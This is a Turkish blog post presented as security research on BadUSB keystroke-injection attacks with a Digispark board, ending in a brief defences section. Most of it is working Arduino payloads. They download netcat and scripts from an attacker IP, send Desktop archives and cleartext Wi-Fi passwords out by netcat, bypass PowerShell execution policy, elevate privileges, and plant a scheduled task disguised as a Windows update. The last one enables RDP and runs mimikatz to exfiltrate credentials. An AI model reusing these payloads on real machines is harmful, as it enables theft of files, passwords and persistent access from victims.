---
title: BadUSB with a Digispark[TR]
published: false
---

<div style="text-align:center"><img src="/assets/myprecious.jpg" alt="Anlık Lamer'lar" ></div>

Bu yazıda, bir siber güvenlik araştırmacısı olarak USB aygıtının klavye olarak algılanmasını sağlayan BadUSB'ye dair kullanılan tekniklerden bahsedecek ve olası senaryolarla nasıl uygulandığını göstereceğim. Yazının sonunda alınabilecek önlemlere de değineceğim. 

Eğer linux ortamında testleri gerçekleştiriyorsanız bu linkten faydalanabilirsiniz.

Arduino IDE yazdığımız komutları badUSB ye yüklemeden önce klavyeyi türkçe olarak ayarladığınızdan emin olun. Resimde tuş girdilerini nasıl kullanacağımızı görebilirsiniz.

<div style="text-align:center"><img src="/assets/4BGX18.png" alt="Klavye" ></div>

Özel tuş girdilerini ise aşağıdaki resimdeki gibi giriyoruz.

<div style="text-align:center"><img src="/assets/V5xMBg.png" alt="Klavye" ></div>

### [](#header-3)Uygulama

Basit bir uygulama ile başlayalım. İlk uygulama sadece notepad.exe yi açarak içine bir mesaj yazsın. 

```
#define kbd_tr_tr // klavye türkçeleştirme
#include "DigiKeyboard.h" // klavye olduğunu algıla

void setup() {
  // put your setup code here, to run once:

}

void loop() {
  DigiKeyboard.sendKeyStroke(0); // basılacağı tuş
  DigiKeyboard.delay(3000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // windows + r
  DigiKeyboard.delay(3000);
  DigiKeyboard.print("notepad.exe");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(3000);
  DigiKeyboard.print("Hello World!");
  for (;;){
    /*lesgo*/
  }
  
}
```

Sondaki döngü ile kodları tekrar başa sarmasını engellemiş oluyoruz. Her komutun sırasıyla çalıştığından emin olmak için aralara `delay` ile bekletme fonksiyonu koyuyoruz. Bekletilecek süre bilgisayar hızına göre değişebilir.

Diğer örnek ile arşivleme işleminin nasıl yapılacağını görelim.

```
#define kbd_tr_tr
#include "DigiKeyboard.h"

void setup() {
  // put your setup code here, to run once:

}

void loop() {
  // put your main code here, to run repeatedly:
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(6000);
  DigiKeyboard.print("powershell");
  DigiKeyboard.delay(4000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(4000);
  DigiKeyboard.print("systeminfo > info.txt");
  DigiKeyboard.delay(4000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(7000);
  DigiKeyboard.print("Compress-Archive -Path ./info.txt -DestinationPath ./info.zip");
  DigiKeyboard.delay(6000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(10000);
  for (;;){
    /*lesgo*/
  }
}
```

Görüldüğü üzere klavye komutları ile işlemler yapıldığı için genel olarak powershell ile cmd betikleri kullanılıyor. Burada yapabilecekleriniz yalnızca terminal hakimiyetinizle ve hayal gücünüzle sınırlı. 

Peki bir hacker hangi senaryoları kullanıyor? Şimdi bu senaryolara bir göz atalım.

### [](#header-3)Teknik 1

Bilgisayardaki dosyaları çekmek için örnekteki gibi netcat dosyası alınıyor ve dosyalar netcat ile gönderiliyor olabilir. 

```
#define kbd_tr_tr
#include "DigiKeyboard.h"

void setup() {
  // put your setup code here, to run once:

}

void loop() {
  // put your main code here, to run repeatedly:
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("$WebClient = New-Object System.Net.WebClient");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("$WebClient.DownloadFile('http://192.168.1.156/nc64.exe','nc64.exe')");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2500);
  DigiKeyboard.print("Compress-Archive -Path ./Desktop/* -DestinationPath ./fullDesktop.zip");
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(3500);
  
  DigiKeyboard.print("exit");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("cmd.exe");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  
  DigiKeyboard.print("nc64.exe 192.168.1.156 8585 < fullDesktop.zip");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  for (;;){}
}
```

### [](#header-3)Teknik 2

Wifi şifreleri alınarak `netcat` ile gönderiliyor olabilir.

```
#define kbd_tr_tr
#include "DigiKeyboard.h"

void setup() {
  // put your setup code here, to run once:

}

void loop() {
  // put your main code here, to run repeatedly:
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("netsh wlan show profile name=\"*\" key=clear > wifipass.txt");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("Start-BitsTransfer http://192.168.1.156/nc64.exe nc64.exe");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1500);
  DigiKeyboard.print("exit");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("cmd");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("nc64.exe -w 3 192.168.1.156 8080 < wifipass.txt");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(4000);
  DigiKeyboard.print("exit");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  for (;;){}
}
```


### [](#header-3)Teknik 3

Kalıcılık sağlamak adına içeri çalıştırılabilir bir dosya alınıyor ve `schtasks` komutu ile zamanlanmış görev ayarlanıyor olabilir.

```
#define kbd_tr_tr
#include "DigiKeyboard.h"

void setup() {
  // put your setup code here, to run once:

}

void loop() {
  // put your main code here, to run repeatedly:
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(1500);
  DigiKeyboard.print("powershell");
  DigiKeyboard.delay(1500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2500);
  DigiKeyboard.print("$WebClient = New-Object System.Net.WebClient");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("$WebClient.DownloadFile('http://192.168.1.156/indir.ps1','indir.ps1')");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1500);
  DigiKeyboard.print("powershell -Execution ByPass -File indir.ps1");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("Start-Process cmd.exe -ArgumentList \"/K cd $HOME\" -Verb RunAs"); // Yetki Yükseltmek için
  DigiKeyboard.delay(1500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2500);
  DigiKeyboard.print("set \"exePath=%CD%/config.exe\"");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("SCHTASKS /Create /SC DAILY /TN \"windows update1339\" /TR \"%exePath%\" /ST 14:16");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  for (;;){
    /*lesgo*/
  }
}
```

### [](#header-3)Teknik 4

Son olarak `rdp` servisi açlıyor ve `mimikatz` kullanılılarak alınan şifreler yine netcat kullanılarak gönderiliyor olabilir.

```
#define kbd_tr_tr
#include "DigiKeyboard.h"

void setup() {
  // put your setup code here, to run once:

}

void loop() {
  // put your main code here, to run repeatedly:
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(1500);
  DigiKeyboard.print("powershell");
  DigiKeyboard.delay(1500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2500);
  DigiKeyboard.print("$WebClient = New-Object System.Net.WebClient");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("$WebClient.DownloadFile('http://192.168.1.156/indir.ps1','indir.ps1')");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1500);
  DigiKeyboard.print("powershell -Execution ByPass -File indir.ps1");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("./Elevate.exe -k"); // Yetki Yükseltmek için
  DigiKeyboard.delay(1500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2500);
  DigiKeyboard.print("uzakbaglanti.bat"); // rdp server
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(3000);
  DigiKeyboard.print("Yes");
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
  DigiKeyboard.print("mimikatz.bat"); // şifreleri çekip sunucuya yolluyor
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(3000);
  for (;;){
    /*lesgo*/
  }
}
```

### [](#header-3)Önlemler

Genel olarak BadUSB komutları, genellikle `Powershell` ve `CMD` betikleri aracılığıyla yürütüldüğünden, bu betiklerin kolayca açılmasını engelleyerek önlem alabiliriz. Bunun için aşağıdaki kodu powershell
üzerinde çalıştırın. Bu komut ile powershell ve cmd betikleri açılmaya çalışıldığında şifre istenecek. Eski hale getirmek için değerini 5 olarak ayarlayın.

```
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" -Value 1
```

Tabii ki bunun nihai önlem olmadığını belirtmekte fayda var. Buna ek olarak `USB port blocker` yazılımıda kullanılabilir.










